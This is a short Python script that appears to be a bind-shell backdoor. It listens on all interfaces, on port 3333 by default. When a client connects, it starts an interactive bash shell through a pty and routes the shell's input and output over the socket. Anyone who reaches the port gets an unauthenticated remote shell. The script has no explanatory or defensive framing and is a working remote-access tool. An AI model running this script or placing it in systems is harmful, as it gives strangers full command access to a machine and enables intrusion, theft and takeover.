#!/bin/python
from socket import *
from sys import argv
from os import path
import sys
import subprocess
import socket
import termios
import tty
from os import path
from sys import stdout

if (sys.version_info.major == 2):
    def get_byte(s, encoding="UTF-8"):
        return str(bytearray(s, encoding))
    STDOUT = stdout
    import thread
else:
    def get_byte(s, encoding="UTF-8"):
        return bytes(s, encoding=encoding)
    STDOUT = stdout.buffer
    import _thread as thread

def stdprint(message):
    stdout.write(message)
    stdout.flush()
    
local_addr='0.0.0.0'
local_port=3333

if (len(sys.argv) == 2):
    local_port=int(sys.argv[1])
elif (len(sys.argv) > 2):
    local_addr=sys.argv[1]
    local_port=int(sys.argv[2])

def main(ipaddr, port):
    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    conn.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    conn.bind((ipaddr, port))
    conn.listen(1)
    try:
        stdprint("Wait on %s %d\n" % (ipaddr, port))
        talk, addr = conn.accept()
        stdprint("Connect from %s.\n" % addr[0])
        #1 p=subprocess.call(["/bin/bash","-i"]);
        #2 
        subprocess.Popen(["python -c 'import pty; pty.spawn(\"/bin/bash\")'"],
            stdin=talk, stdout=talk, stderr=talk, shell=True)
        #3 pty.spawn("/bin/bash")
    except KeyboardInterrupt:
        pass
        # stdprint("Connection close by KeyboardInterrupt.\n")
    finally:
        stdprint("Connection close...\n")
        conn.close()

main(local_addr, local_port)

